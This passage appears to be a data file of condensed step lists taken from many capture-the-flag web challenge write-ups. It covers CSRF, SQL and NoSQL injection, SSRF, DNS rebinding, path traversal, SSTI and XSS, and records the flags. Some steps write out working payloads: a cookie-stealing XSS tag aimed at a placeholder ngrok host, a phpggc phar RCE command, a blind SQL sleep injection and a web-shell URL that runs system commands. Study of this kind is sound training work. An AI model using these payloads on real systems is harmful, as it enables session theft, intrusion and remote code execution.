    "Observe the 'Wrong Referrer' error",
    "Attempt to change status to 'premium'",
    "Observe the 'Permission Denied!' message",
    "Decide to use CSRF attack",
    "Set the goal of changing the status to 'premium'",
    "Note that the only missing piece is the 'token'",
    "Create the payload",
    "Use a length of '32 bytes' for the payload",
    "Note that 'name' is a short form of 'window.name' property",
    "Send the admin to the webpage",
    "Trigger the 'window.open' function with the payload",
    "Set 'window.name' to the long payload",
    "Send the admin to the page with the payload",
    "Find the flag in the profile: 'ctfzone{0190af5705a38115cd6dee6e7d79e317}'",
    "Identify the provided file is a packet capture (.pcap) file.",
    "Use Wireshark to read the packet capture file.",
    "Search for HTTP packets within the packet logs.",
    "Locate the POST requests to '/login.php'.",
    "Note the presence of 'username', 'cnonce', and 'hash' parameters.",
    "Detect that the JavaScript file 'bundle.js' is used to calculate the hash value.",
    "Identify the existence of a WebSocket tunnel from the 'HTTP/1.1 101 Switching Protocols' packet.",
    "Analyze the JavaScript bundle to understand how the hash is calculated.",
    "Identify needed parameters: username, nonce, and cnonce.",
    "Observe that the password is not given directly but might be related to the hash.",
    "Inspect the injected JavaScript code that is responsible for WebSocket communication.",
    "Understand that the client-server communication uses an encoding function.",
    "Identify the involved keys - 'key' and 'key2'.",
    "Note that client's 'User-Agent' value is used in the encoding function.",
    "Understand that this value can be fetched from HTTP headers.",
    "Validate the encoding function by checking if it produces the same encoded message as captured in unmasked WebSocket packets in Wireshark.",
    "Determine that 'key2' is a shuffled version of 'key'.",
    "Understand that this shuffle is based on seeded random values tied to the 'User-Agent'.",
    "Identify that an attacker has set up a keylogger.",
    "Understand that this keylogger sends each pressed key to an external server as an encoded message.",
    "Separate WebSocket packets into ones that are related to sent messages (particularly user input).",
    "Identify unrelated packets such as 'pings'.",
    "Dump the related WebSocket packets for further analysis (decoding).",
    "Briefly analyze the encoding function to get the basic idea for decoding messages.",
    "Start the decoding process by reversing the function: encoded_arr.split('').map( x => key.indexOf(x) ).reverse().",
    "Continue the decoding process by solving for 'c' in the equation: c = seed, c0 = c + prev_encoded_arr[0] * 256, encoded_arr[0] == c0 % 58.",
    "Note that only 'encoded_arr[0]' is known, and 'seed' is the actual character of 'msg' that we are trying to find.",
    "Use brute force to solve for a set of possible solutions for 'c' and 'prev_encoded_arr[0]'.",
    "Narrow down the solutions by progressing through succeeding elements of 'prev_encoded_arr[]'.",
    "Implement a recursive function to retrieve one character from 'msg' for each WebSocket packet.",
    "Repeat the process for characters in each WebSocket packet.",
    "Remove unwanted characters from the decoded message.",
    "Extract the final flag.",
    "Downloaded the src.zip file",
    "Acquired the file from the provided link",
    "Extracted the contents of the zip file",
    "Found the bundle.js file",
    "Found the index.html file",
    "Identified the task as finding the correct password",
    "Located an input field on the provided webpage",
    "Recognized the obfuscation of the JavaScript code",
    "Acknowledged the increased challenge in analyzing the code",
    "Opened the web-browser's developer tools",
    "Activated the JavaScript debugger",
    "Monitored the execution flow of function calls",
    "Noted the sequence of function calls",
    "Identified a string within the JavaScript scope",
    "Recognized the string as representing the flag",
    "Noted the specific flag value: HarekazeCTF{j4v4scr1pt-0bfusc4t0r_1s_tsur41}",
    "Confirmed the successful acquisition of the flag",
    "Verified the flag value: HarekazeCTF{j4v4scr1pt-0bfusc4t0r_1s_tsur41}",
    "Access the provided URL for the decryption service.",
    "Note the UUID prefix '9e5a' mentioned in the challenge description.",
    "Download the provided 'src.zip' file from the challenge description.",
    "Download the provided 'flag.png.encrypted' file from the challenge description.",
    "Unzip 'src.zip'.",
    "Inspect the unzipped contents of 'src.zip'.",
    "Focus on the 'decrypt.php' file.",
    "Understand that the 'decrypt.php' file suggests the potential for an SQL injection via the UUID POST data.",
    "Further inspect the contents of 'functions.php' file.",
    "Identify a function that validates the input of a UUID in 'functions.php'.",
    "Understand that the input format for the SQL injection should match the UUID format.",
    "Understand the correct UUID format and the known prefix.",
    "Construct an SQL injection query based on the format.",
    "Include a statement to match the initial UUID sequence.",
    "Restructure the query to generate a SQL query that operates as 'SELECT id LIKE '9e5a%'.",
    "Perform the SQL injection using the constructed input string.",
    "Decrypt the 'flag.png.encrypted' file.",
    "Retrieve the flag from the decrypted image.",
    "Analyze the web application/database setup's behavior.",
    "Identified a heavily filtered error-based blind sql injection.",
    "Develop an SQL payload that determines the length of the intended data ('flag').",
    "Test the SQL payload by iteratively substituting different lengths for '$LENGTH$'.",
    "Analyze the results from the SQL payload tests.",
    "Determine that the length of the flag is 38 characters.",
    "Leverage dual hexing technique to transform the flag.",
    "Observe that the new representation of the flag is a 152-digit long number.",
    "Pass a range of data values to test the properties of the number casting in the database.",
    "Determine that integer values exceeding '9223372036854775807' will be converted into floating numbers.",
    "Attempt to concatenate large integers in SQLite.",
    "Find that SQLite treats large integers the same way it treats strings during concatenation.",
    "Use the SQL function 'max(A, B)' to sort through the concatenated 152-digit number.",
    "Identify all instances of the 152-digit number.",
    "Assemble the migrated instances of the 152-digit number.",
    "Identify the final flag from the assembled digits.",
    "Notice that the JavaScript code checks if the outcome equals 1337 to give the flag",
    "Note that the code must contain only lowercase letters, parentheses, and periods",
    "Create a payload using functions that, when run, return 1337",
    "Use the factorization of 1337 (7*191) to create the first payload",
    "Reduce the number of characters in the payload by improving upon the first solution",
    "Further reduce the payload character count by poking around and using different functions",
    "Use a new approach that does not involve factorization to achieve a payload with an even smaller character size",
    "Improve the payload further by using different JavaScript functions to reduce the character count",
    "Meet the condition in the JavaScript code by running a payload such that it equals 1337",
    "The code gives the flag upon meeting the condition",
    "Visit the website.",
    "Assess the functionality of the web page.",
    "Check for a possibility of XSS injection in the CSRF token script.",
    "Check the site's 'Bug Bounty' form.",
    "Submit suspicious URLs to be visited by a headless Chrome agent.",
    "Attempt to utilize CSRF mechanism.",
    "Gain admin access.",
    "Create a CSRF page.",
    "Attempt to add the attacker's email to the admin's shared note.",
    "Use <meta name='referrer' content='no-referrer'>.",
    "Bypass the restriction caused by the referrer header.",
    "Overwrite document.domain using Object.defineProperty(document, 'domain', {value: 'yeunote.ctf.yeuchimse.com'});",
    "Construct a post form.",
    "Add the attacker's email to the admin's shared list.",
    "Manage to access the admin's note.",
    "Face a password prompt.",
    "Notice that clicking on 'Facebook', 'Google' or 'Twitter' buttons attaches the note id and password to the shared URL.",
    "Try to implement a similar mechanism to the CSRF mechanism used earlier.",
    "Grab the password.",
    "Attempt to log in the admin to a dummy Twitter account.",
    "Share the password.",
    "Notice an undeleted Tweet.",
    "Contain the password.",
    "Try different versions of the Twitter login page.",
    "Authenticate on behalf of the admin without success.",
    "Try to generate 'oauth tokens' for the flag note.",
    "Share the generated URL with the admin.",
    "Find out it is achievable by making two additional GET requests.",
    "Make the first GET request: 'GET https://yeunote.ctf.yeuchimse.com/note/twitter/3'.",
    "Make the second GET request: 'GET https://yeunote.ctf.yeuchimse.com/note/twitter?oauth_token=<oauth token>&oauth_verifier=<oauth verifier>'.",
    "Intercept 'oauth tokens' by stopping the request from 'twitter' to 'yeunote'.",
    "Use burp tool to execute the interception.",
    "Accessed URL http://138.68.228.12/?is_debug=1.",
    "Obtained index.php source code from source code.",
    "Identified task to bypass countermeasures.",
    "Gain full control of the $whoareyou variable.",
    "Realized necessity to create raw HTTP requests.",
    "Hijack the $whoareyou variable.",
    "Created the GET request: 'GET ..@alien.somewhere.meepwn.team/..//index.php?alien=%40!%23%24%40!%40%40 HTTP/1.1 Host: 138.68.228.12 Connection: close'.",
    "Identified manipulating capabilities of Apache2.",
    "Directory switching.",
    "Used format of '..://alien.somewhere.meepwn.team/../..//index.php' request.",
    "Caused Apache2 to crash due to ':' in directory name.",
    "Managed to bypass the 'strpos(urldecode($remote),'..')' condition.",
    "Managed to bypass the 'parse_url($remote, PHP_URL_HOST)' condition.",
    "Managed to control $whoareyou variable.",
    "Passed through conditions checking for specific value comparisons.",
    "Used a bash script to extract the PHPSESSID with auth set.",
    "Received form on alien_sector.php.",
    "Had the right PHPSESSID in cookies.",
    "Abused the type attribute.",
    "Sent the request 'type=/../super_secret_shell.php'.",
    "Created a reverse shell script using only non-alpha chars.",
    "Bypassed message length restriction.",
    "Ran the shell script by visiting the URL 'http://138.68.228.12/alien_message/super_secret_shell.php?_=system&__=rgrep MeePwn /var/www/'.",
    "Received the flag: MeePwnCTF{__133-221-333-123-111___}.",
    "Found alternative solution posted by P4Team.",
    "Used distinct virtual hosts and shell wildcards for the same result.",
    "Identify that the request was double proxied with Apache.",
    "Identify that the request was double proxied with Nginx.",
    "Discover that Apache2 is restrictive towards parsing the HTTP request.",
    "Note that Nginx blocks '/debug*'.",
    "Note that Apache blocks '/debug*'.",
    "Find information on Angular's secondary segments in paths.",
    "Investigate Angular's source code.",
    "Discover a 'primary' segment in Angular.",
    "Use the primary segment to create a URL.",
    "Create a URL that would circumvent the '/debug*' restriction.",
    "Visit the manipulated URL.",
    "Retrieve the flag.",
    "Found a way to bypass the Angular application.",
    "The Angular application was set up behind an Nginx reverse proxy.",
    "Successfully accessed the '/debug/answer' endpoint.",
    "The '/debug/answer' endpoint was restricted by both Nginx and the application.",
    "Utilized a trick where Angular recognizes '\\' as '/'.",
    "Used %-decodes strings to match the '/debug/answer' endpoint.",
    "Performed a simple curl request to '/\\%64ebug/answer'.",
    "Found an alternative method to solve the challenge for the second flag.",
    "Injected '\\debug\\answer' as the host in a curl request.",
    "Verified that Angular parses the URL created from 'PROTOCOL + HOST + PATH'.",
    "Identified the challenge.",
    "Determined the challenge requires bypassing an Angular application setup behind an Nginx reverse proxy.",
    "Recognized first flag hidden in angular endpoint /debug/answer restricted by Nginx and application.",
    "Recognized second flag hidden in express endpoint /api/true-answer accessible only from localhost.",
    "Analyzed server-side JavaScript handling requests to '/api/true-answer'.",
    "Determined the system only responded with the flag if the request came from the loopback network.",
    "Noted the situation that even though the app was hidden behind Nginx reverse proxy.",
    "'req.ip' always pointed to the same IP address of the reverse proxy.",
    "Identified that the application didn't trust 'X-Forwarded-*' headers.",
    "Realized the IP address couldn't be overridden as a result.",
    "Accessed '/q' endpoint.",
    "Observed the application displaying contents of '/api/answer'.",
    "Understood this was done server-side.",
    "Identified 'this.service.getAnswer()' command in the Angular application.",
    "Understood it led to 'this.http.get('/api/answer')'.",
    "Recognized it as part of Angular's internal methods fetching '/api/answer' from server-side.",
    "Discovered Angular uses a Host header - 'PROTOCOL + HOST + / PATH' while performing HTTP requests.",
    "Noticed Angular also follows redirects.",
    "Formulated a strategy to provide a custom host.",
    "Planned to redirect anything to '127.0.0.1/api/true-answer' to capture the flag.",
    "Executed the curl command 'curl 'http://universe.chal.ctf.westerns.tokyo/a' -H 'Host: terjanq.me'.",
    "Successfully bypassed restrictions.",
    "Successfully obtained the flag {you-have-to-eat-tomato-yume-chan!} as a result of the bypass.",
    "Identified the application was protected by DOMPurify in version 2.0.16.",
    "Learned of an existing bypass in Chrome for the version of DOMPurify the application was using.",
    "Abused strange behaviors of `<math>` elements.",
    "Used the provided bypass.",
    "Attempted to mutate the element in order to bypass the sanitizer.",
    "Ran a JavaScript snippet to test different elements for vulnerabilities with the DOMPurify sanitizer.",
    "Tested different elements for vulnerabilities with the `<math>` element bypass.",
    "Identified a mutation with the `<table>` element.",
    "Realized the mutation could be simplified to create the exploit.",
    "Created a payload to leak cookies to the server.",
    "Utilized the earlier-found mutation to leak cookies to the server.",
    "Identified that the challenge seemed to involve reCAPTCHA.",
    "Realized the previous solution may not have been intended.",
    "Decided to look for another way to solve the challenge.",
    "Realized the application was simulating a Brainf*ck decompiler.",
    "Discovered `<` and `>` characters were protected using a `replaceAll` function.",
    "Understood that the `writeOutput` function could potentially be invoked while the program was still running.",
    "Realized this could lead to unreplaced `<` and `>` characters.",
    "Recognized that the condition for this to occur was the function not being called.",
    "Used DOM Clobbering to bypass the `CONFIG.unsafeRender` check.",
    "Injected two `reCAPTCHA` buttons.",
    "Manipulated the `statusCode` using the injected buttons.",
    "Implemented a trick to bypass `innerText` resetting the prepared CONFIG clobbering in the payload.",
    "Crafted a final payload that exploits the bypass.",
    "Rewrote the document to `/terjanq/` using the crafted payload.",
    "Identify the goal of this CTF problem is to bypass WAF protection.",
    "Identify the goal of this CTF problem is to access local resources.",
    "Study the provided Python script.",
    "Identify that the program attempts to validate IP addresses.",
    "Identify that the program checks if IP matches certain values to confirm it's a valid non-private IP.",
    "Note the condition within the 'admin_status' function.",
    "Identify that the condition only returns the flag if the request is coming from a '127.0.0.1' IP address.",
    "Recognize that the 'valid_ip' function restricts usage of certain IP addresses.",
    "Identify the IP addresses that are restricted.",
    "Identify that the restrictions include the localhost (127.0.0.1).",
    "Identify the possibility of representing the localhost (127.0.0.1) in a different notation.",
    "Identify the restrictions set in the 'valid_ip' function.",
    "Identify that representing the localhost (127.0.0.1) in a different notation can bypass the restrictions.",
    "Use the octal notation of 127.0.0.1 IP address.",
    "Identify the octal notation of 127.0.0.1 IP address is 0177.0.0.1.",
    "Identify that using the octal notation can bypass the restrictions.",
    "Make a HTTP request.",
    "Specify the target URL as 'http://0177.0.0.1/admin-status'.",
    "Ensure the request is made from the localhost.",
    "Observe the returned flag.",
    "Identify the goal: Bypass a WAF (Web Application Firewall).",
    "Use the ipaddress library in Python to check the IP address.",
    "Understand the provided code.",
    "Check if the IP is a private IP using the ipaddress library.",
    "Proceed to send a GET request to the provided URL if the IP is not private.",
    "Observe the code structure.",
    "Perform the first DNS resolution to check if the destination is private.",
    "Perform the second DNS resolution to request the resource.",
    "Add the first A record to the DNS entry to resolve to 127.0.0.1.",
    "Add the second A record to the DNS entry to resolve to 51.38.138.162.",
    "Attempt to bypass the double-check using the modified DNS entry.",
    "Repeat the attempts until the flag is obtained.",
    "Consider setting up a personal DNS server for a more reliable solution.",
    "Configure the personal DNS server to respond with a public IP during the IP check.",
    "Configure the personal DNS server to resolve to the local IP during the GET request.",
    "Consider using a tool like singularity to set up a DNS server.",
    "Set up the DNS server similar to DNS Rebinding.",
    "Use the DEMO application provided by singularity.",
    "Replace the RANDOM placeholder in the URL with something random.",
    "Identify that input sanitization is only implemented on the front end via JavaScript.",
    "Decide to use burpsuite to bypass the front-end input sanitization.",
    "Configure the burpsuite tool.",
    "Start the burpsuite tool.",
    "Intercept data between the server and the client.",
    "Intercept the data.",
    "Manipulate the intercepted data using burpsuite.",
    "Bypass the front end input sanitization.",
    "Read the hint for this challenge",
    "Conduct research on the CVE related to this challenge",
    "Identify the Laravel version used in the challenge",
    "Find the exploit related to the identified CVE",
    "Gather supporting materials for the exploit",
    "Search for 'ip/_ignition/execute-solution' in the Laravel panel",
    "Access the found Laravel panel",
    "Perform a post request in the Laravel panel",
    "Receive a 302 response",
    "Visit the GitHub exploit page 'https://github.com/ambionics/phpggc'",
    "Visit the GitHub exploit page 'https://github.com/ambionics/laravel-exploits'",
    "Create a phar file",
    "Use the custom command from 'phpggc' repo",
    "Insert the phar file into the exploit",
    "Specify the URL for the exploit",
    "Run the exploit",
    "Execute the command 'php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system \"cat /flagM1AhS\"'",
    "Run the exploit with the specified phar file",
    "Read the obtained flag",
    "Visit the webpage.",
    "Found a part of the flag: CHTB{",
    "Explore the file /static/js/main.",
    "Found another part of the flag: us3full_1nf0rm4tion}",
    "Look into static/css/main.css.",
    "Found a potential hint: c4n_r3ve4l_",
    "Find the file js.main.",
    "Found the last piece of the flag: 1nsp3ction_",
    "Combine all the collected flag parts.",
    "Form the complete flag: CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}",
    "Identify a hint in the website.",
    "Recognize the potential involvement of code str_replace in changing language.",
    "Recognize a possible chance to test Local File Inclusion (LFI).",
    "Identify the URL 'ip.address/?lang=es.php' as a potential target for LFI.",
    "Identify that developers may have used blacklisting to prevent path traversal.",
    "Recognize the replacement of certain string patterns as a blacklisting mechanism.",
    "Infer that payload modification is necessary to bypass security measures.",
    "Recognize the use of repeated directory traversal sequences in payload modification.",
    "Execute the first successful exploit.",
    "Plug in a modified payload with a long sequence of directory traversal in the URL.",
    "Observe the result of the exploit leading to '/etc/passwd'.",
    "Find the flag by testing one more exploit.",
    "Use the modified payload in the exploit.",
    "Observe the result of the exploit leading to '/flag'.",
    "Access the login page.",
    "Access the source code of the web app.",
    "Analyze the 'entrypoint.sh' bash file.",
    "Note the MongoDB storage of a password with username 'admin'.",
    "Aim to extract the password serving as the flag.",
    "Investigate potential for NoSQL injection due to use of MongoDB.",
    "Intercept the login request with 'Burpsuite'.",
    "Inspect the response better.",
    "Note the Json response upon attempted logins.",
    "Note the message displayed on the front end upon attempted logins.",
    "Attempt basic payloads for NoSQL injection.",
    "Observe unsuccessful results.",
    "Attempt authentication bypass with advanced payloads.",
    "Use RegEx payload.",
    "Confirm presence of characters in the password.",
    "Confirm that the flag begins with 'CHTB{'.",
    "Progressively brute-force characters.",
    "Check successful log-in messages to determine correct characters.",
    "Develop a Python script to automate the brute-forcing of characters.",
    "Run the script.",
    "Obtain the complete flag.",
    "Analyze the given files.",
    "Identify it as a Python environment.",
    "Identify the usage of the Python Pillow library.",
    "Notice the usage of a vulnerable version of the Python Pillow library.",
    "Search for related pull requests on github.",
    "Gain insights from the related pull request.",
    "Extract the understanding from the pull request.",
    "Locate the usage of 'eval' in util.py.",
    "Identify that 'eval' is used on data from the POST request.",
    "Extract the understanding of the possibility to upload an image.",
    "Recognize that RGB parameters can be manipulated in the uploaded image.",
    "Conduct experiments with uploading images.",
    "Manipulate RGB values in the uploaded images.",
    "Replace one of the RGB values in the 'background' parameter.",
    "Successfully read the flag.txt file using the manipulated RGB value.",
    "Export or send the content of flag.txt.",
    "Send the content of flag.txt to a webhook.",
    "Examined the application.",
    "Noted the process of converting markdown input to PDF file for download.",
    "Examined the 'package.json' file in the site source.",
    "Identified the dependencies 'md-to-pdf' and 'nunjucks' in the 'package.json' file.",
    "Conducted research on 'md-to-pdf'.",
    "Discovered a CVE for 'md-to-pdf'.",
    "Identified a payload that could potentially exploit the vulnerability in 'md-to-pdf'.",
    "Revisited the original payload.",
    "Conducted further research on 'nunjucks'.",
    "Discovered a known issue in 'nunjucks' related to single line payload.",
    "Identified the need to adjust the payload for 'nunjucks'.",
    "Adjusted line 1 and 3 of the payload to work with 'nunjucks'.",
    "Generated a payload for executing a command.",
    "Executed the payload to find the flag.",
    "Redirected the flag to a file in the invoices directory.",
    "Captured the flag with the payload.",
    "Arrived at the support page.",
    "Observed POST request capability.",
    "Observed login page.",
    "Sent the payload <img src=x onerror=this.src='<NGROK-LINK-HERE>/?'+document.cookie;>.",
    "Received a JWT session token.",
    "Decoded the JWT token.",
    "Revealed the 'username', 'uid', and 'iat' from the decoded JWT token.",
    "Discovered the API endpoint /api/users/update.",
    "Sent a request to update the password via XHR.",
    "Logged in with the new password.",
    "Attempted to escalate privileges by changing the 'uid' from 100 to 1 using the previous payload.",
    "Logged back in with escalated privileges.",
    "Visit the website.",
    "Observe login page with no additional information.",
    "Check the docker configuration file.",
    "Look for additional information in the file.",
    "Determine that the website is a Flask application.",
    "Determine that the website is running on a MySQL database.",
    "Suspect possible SQL Injection.",
    "Discover the config.py file.",
    "Find database information within the file.",
    "Review the database.py file.",
    "Find hint suggesting input was not sanitized.",
    "Deduce that the database logic requires password token.",
    "Capture the login request.",
    "Use sqlmap tool.",
    "Apply sqlmap on the saved login request.",
    "Attempt to extract database details.",
    "Successfully extract the user.",
    "Successfully extract the password token.",
    "Log in using extracted credentials.",
    "Successfully obtain the flag.",
    "Received the URL and Docker file for the challenge.",
    "Accessed the website.",
    "Observed the status report of the combat robot and a command prompt.",
    "Analyzed the Docker file.",
    "Discovered a hint.",
    "Suggested that the 'shell_exec' function is running.",
    "Clarified that the 'shell_exec' function executes a command in a shell and returns the output.",
    "Identified a potential vulnerability.",
    "Noted that the 'shell_exec' function may be unsanitized.",
    "Suggested that unsanitized 'shell_exec' function allows for potential shell command exploits.",
    "Attempted to escape the 'shell_exec' function.",
    "Attempted to run shell commands.",
    "Confirmed that the exploit worked.",
    "Able to run shell commands.",
    "Used the exploit.",
    "Read the flag.",
    "Checked the login page source code.",
    "Checked the docker files.",
    "Realized application is running Flask with MySQL.",
    "Noticed similarity to previous Drobots challenge.",
    "Found database config info in config.py.",
    "Looked into database.py.",
    "Noticed password verification with passwordVerify.",
    "Saved the request.",
    "Used sqlmap to brute force the password and obtain the token.",
    "Logged in with the obtained credentials.",
    "Noticed a change in website functionality.",
    "Checked routes.py file.",
    "Identified application logic.",
    "Identified missing file escape for characters on the filename.",
    "Utilized path traversal to access /etc/passwd file.",
    "Relocated flag name from 'flag.txt' to 'signal_sleuth_firmware' in root.",
    "Extracted the flag.",
    "Open the app's login page.",
    "Notice an option to register a new account.",
    "Check the network tab.",
    "Notice a graphql endpoint.",
    "Go to a third-party website.",
    "Generate an introspection query for graphql.",
    "The introspection query returns all the content of a graphql schema.",
    "Copy the introspection query.",
    "Paste the introspection query into BurpSuite.",
    "Send the introspection query to the graphql endpoint.",
    "Receive a full introspection response from the /graphql endpoint.",
    "Paste the introspection data received into the graphql voyager tool.",
    "Visualize the data structure using the graphql voyager tool.",
    "Identify a 'Mutation' query in the graphql schema.",
    "The 'Mutation' query allows change of a user password.",
    "Use the 'UpdatePassword' mutation.",
    "Change the admin account's password.",
    "Log into the admin account.",
    "Use the new password.",
    "Discover the flag.",
    "Open the developer tools.",
    "Navigate to the network tab.",
    "Search for a script.js file.",
    "Analyze the content of the script.js file.",
    "Identify the code that checks for a 4 digit pin.",
    "Observe the code fetching the flag based on the pin value.",
    "Switch to the console.",
    "Log the \"CONFIG\".",
    "Observe the output of the \"CONFIG\" log.",
    "Enter the correct pin.",
    "Press the enter key.",
    "Observe the returned flag.",
    "Examine the service.",
    "Identify that the service lists all the items in the mentioned directory.",
    "Search for the flag.",
    "Look for elements in the '/home' directory.",
    "Browse the 'user' directory.",
    "Find the 'flag.txt' file.",
    "Navigate to the '/home/user' directory.",
    "Perform the 'cat' command on '/home/user/flag.txt'.",
    "Discover the flag.",
    "Modify the server configuration settings",
    "Point the server to the testing server IP address or domain",
    "Enter the username 'admin'",
    "Enter the password 'admin'",
    "Submit the authorization request",
    "Construct the request for the flag",
    "Send the request to the server",
    "Retrieve the flag from the server's response",
    "Visit the company website for the CTF challenge",
    "Observe URL Capture button on the website",
    "Observe Admin button on the website",
    "Find out that the URL capture service takes a screenshot",
    "Discover that the captured screenshot is of a submitted webpage URL",
    "Discover the existence of an admin login page",
    "Attempt to access localhost on the URL capture service",
    "Succeed in accessing localhost on the URL capture service",
    "Observe that the loading splash screen is identical to the challenge website",
    "Check the content of robots.txt",
    "Discover a new path /server-status",
    "Attempt to access /server-status",
    "Succeed in accessing /server-status",
    "Discover the login credentials in the logs",
    "Visit the login page.",
    "Confirm that the login page does not contain any JavaScript code.",
    "Enter an apostrophe in the username field.",
    "Enter an apostrophe in the password field.",
    "Observe that a status 500 is received.",
    "Enter an apostrophe in both the username and password fields.",
    "Confirm that no error occurs.",
    "Enter blank input enclosed in two apostrophes in the username field.",
    "Enter a single apostrophe in the password field.",
    "Observe the occurrence of an error.",
    "Determine that the error indicates the presence of an unclosed apostrophe.",
    "Enter blank input enclosed in two apostrophes in both the username and password fields.",
    "Confirm that no error occurs.",
    "Inject the payload ' or sleep(2) and 1=1#.",
    "Confirm the presence of blind SQL injection.",
    "Compare the syntax differences between the observed behavior and other database systems.",
    "Deduce that it is MySQL.",
    "Bruteforce the flag character by character.",
    "Use the SUBSTRING and SLEEP functions for each character.",
    "Explain the syntax and usage of the SUBSTRING function.",
    "Explain the syntax and usage of the IF function.",
    "Create a Python script to automate the process.",
    "Send a post request with the payload for every possible character in the flag.",
    "If a correct character is found (indicated by a read timeout), append the character to the flag and move to the next character.",
    "Check the cells",
    "Find a formula",
    "Identify that the formula points to another sheet's labeled 'Source'",
    "Identify a specific range 'A:B'",
    "Activate accessibility tools in the Tools section",
    "Unhide hidden sheets",
    "Using Accessibility Tool",
    "Call a range from the document",
    "Realize that a hidden sheet's full range can be accessed",
    "Type the hidden sheet's name",
    "Reveal the hidden sheet",
    "Hidden sheet gets added to the panes",
    "Find the flag",
    "Flag is inside the hidden sheet",
    "Enter username 'admin' and password 'admin' to login.",
    "Submit the login form.",
    "Click on the 'simple quiz' link or button to navigate to the quiz section.",
    "Search or browse through the quiz section to find the flag.",
    "Retrieve the flag value 'flag{th3_an5w3r_w4s_HSCTF_0bvi0us1y}'.",
    "Log in using the provided credentials.",
    "Observe the presence of a cookie named userData with userID and username.",
    "Analyze the server code files.",
    "Focus on app.js.",
    "Discover that the correct user id is required for admin access, not the password.",
    "Launch BurpSuite.",
    "Send the request with the cookie to the intruder.",
    "Replace the username with 'admin'.",
    "Set the payload parameter at userID.",
    "Configure a grep match for 'flag{' to locate the start of the flag.",
    "Search for a checked checkbox for 'flag{'.",
    "Identify the flag in the response section of that response.",
    "Change the cookie values: userID to 768 and username to 'admin'.",
    "Verify the flag on the website.",
    "Obtain the final flag: 'flag{y4m_y4m_c00k13s}'.",
    "Entered 'view-source:https://no-right-click.hsc.tf/useless-file.css' in the browser's address bar.",
    "Investigate the site.",
    "Understand the rules of the site.",
    "Try various inputs.",
    "Include special characters in the inputs.",
    "Note the responses for each input.",
    "Open the server.py file.",
    "Read and understand the requirement for three keys.",
    "Brainstorm ideas.",
    "Apply logic to explore the use of commas as input.",
    "Submit a single comma as input.",
    "Investigate the response to the input.",
    "Increase the number of commas in the input to three.",
    "Consider the requirement for three keys and adjust the input accordingly.",
    "Observe the output.",
    "Note the hint regarding the character set.",
    "Utilize the observed character set.",
    "Combine it with the input of three commas to meet the requirement.",
    "Submit the input.",
    "Receive the flag.",
    "Visited the website and viewed the login page",
    "Constructed a JSON body with username and password",
    "Sent the JSON body to the server",
    "Noticed that error messages are displayed in a javascript alert",
    "Inspected the page source and found no abnormalities",
    "Used Burp Suite to intercept the login request",
    "Modified the JSON body by removing the 'name' key value pair",
    "Observed the resulting error message",
    "Analyzed the error message and deduced that a Python Flask backend is used",
    "Noted that exception messages are displayed in alert pop-ups",
    "Realized that the 'name' key value pair is required",
    "Attempted to remove the 'password' key from the JSON body",
    "Examined the 'if' condition that appears to determine the login logic",
    "Noticed that the SHA256 hash is calculated using the concatenation of 'password' and 'salt'",
    "Observed the comparison between the calculated hash and the 'hash' value",
    "Noticed that the 'salt' and 'hash' values are extracted from the JSON request body",
    "Realized that these values are used for the calculation and comparison",
    "Understood that it is possible to set custom values for 'salt' and 'hash'",
    "Developed a Python script to retrieve the flag",
    "Recognized that any values can be used for 'username', 'password', and 'salt' as long as the if condition is met",
    "Start at a login/register page.",
    "Login into the system.",
    "Explore the public feed.",
    "Explore the profile settings.",
    "Explore the report link.",
    "Explore the create post button.",
    "Explore the search functionality.",
    "Explore the copy profile link feature.",
    "Explore the followers functionality.",
    "Understand how to modify user's profile and upload images.",
    "Try XSS payloads on different input fields.",
    "Discover that JavaScript is blocked.",
    "Try a bypass method by uploading HTML files disguised as image files.",
    "Discover that HTML files are uploaded successfully despite checks for images.",
    "Realize that HTML files don't execute on the server side.",
    "Understand that HTML files are downloaded with random filenames.",
    "Switch strategy and attempt to upload an HTML file containing a simple JavaScript function.",
    "Observe that JavaScript inside the uploaded HTML does execute.",
    "Realize that JavaScript doesn't execute when directly input into the application's fields.",
    "Understand the need to 'steal' an admin cookie and gain admin access.",
    "Encounter the HttpOnly problem.",
    "Review the challenge description again.",
    "Shift focus to the 'following' feature.",
    "Craft a JavaScript snippet that sends a GET request to the '/profile/follow' endpoint.",
    "Understand that the script would theoretically make any user follow the attacker account.",
    "Embed the crafted JS snippet into an HTML file.",
    "Upload the HTML file to the user profile.",
    "Get the uploaded HTML file link from the webpage.",
    "Report the HTML file link to trick admin into opening it.",
    "Execute the JS script silently when admin opens the page.",
    "Confirm the success of the attack by checking for a new follow request from admin.",
    "Attempt to guess admin's subdomain.",
    "Utilize the 'subdomain enumeration' technique when guessing proves unsuccessful.",
    "Discover the admin's subdomain.",
    "Visit the admin's profile and find out it is private.",
    "Find a 'follow' button on the admin's profile.",
    "Attempt to follow admin.",
    "Receive a pending request response.",
    "Decide to use the same strategy to make admin accept the follow request.",
    "Understand that a POST request must be sent to '/profile/request' to make admin accept the follow request.",
    "Embed the 'id' of the attacker's user in the request body.",
    "Locate the JWT token within the session cookie.",
    "Decode the JWT token.",
    "Extract the 'id' of the user (attacker) from the decoded JWT token.",
    "Send the POST request to '/profile/request' with the 'id' of the attacker's user to gain admin's acceptance as a follower.",
    "Find the flag within a fan post after gaining admin's acceptance as a follower.",
    "Complete the challenge.",
    "Establish a connection to localhost:12380.",
    "Use Apache httpd 2.4.49 to handle the connection.",
    "Conduct research on vulnerabilities of Apache httpd 2.4.49.",
    "Identify potential exploits that can be used.",
    "Execute the 'ls' command to list files in the current directory.",
    "Execute the 'cat' command to view the contents of a file.",
    "Utilize the curl command to navigate through subdirectories.",
    "Identify and exploit vulnerabilities present in the Apache server.",
    "Access the desired file using the exploited vulnerabilities.",
    "Encode the flag.png file using Base64 encoding.",
    "Include the Base64 encoded data as part of the request payload.",
    "Perform this step to prevent unintended data loss or corruption.",
    "Receive the Base64 encoded png file on the local machine.",
    "Executed NIKTO scan.",
    "Used the command: nikto -h http://172.17.15.117:443/",
    "Observed line in the scan result.",
    "Line shows: '+ /.env: .env file found. The .env file may contain credentials.'",
    "Followed directory path indicated in the scan result.",
    "Explored further based on the directory path.",
    "Inserted file name in the URL.",
    "URL: http://172.17.15.117:443/3e6f0e21-7faa-429f-8a1d-3f715a520da4.png",
    "Discovered the flag.",
    "Connect to target IP:33337.",
    "Observe redirection to domain name threeofhearts.ctf.net.",
    "Discover website hosting on Apache Traffic Server 7.1.1.",
